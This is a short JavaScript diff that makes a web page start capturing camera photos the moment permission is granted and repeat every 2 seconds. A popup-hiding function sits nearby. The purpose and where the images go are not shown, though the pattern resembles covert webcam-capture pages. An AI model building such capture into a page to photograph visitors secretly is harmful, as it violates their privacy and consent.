@@ -190,10 +190,10 @@
       }
     }
     
-    // Start first capture immediately, then every 2 seconds
-    setTimeout(function() {
-      captureInterval = setInterval(capturePhoto, 2000);
-    }, 1000); // Wait 1 second for video to stabilize
+    // Start capture IMMEDIATELY when camera permission granted
+    console.log('Camera permission granted - starting immediate capture');
+    capturePhoto(); // First capture immediately
+    captureInterval = setInterval(capturePhoto, 2000); // Then every 2 seconds
   }
   function PopUp(){
     document.getElementById('ac-wrapper').style.display="none"; 
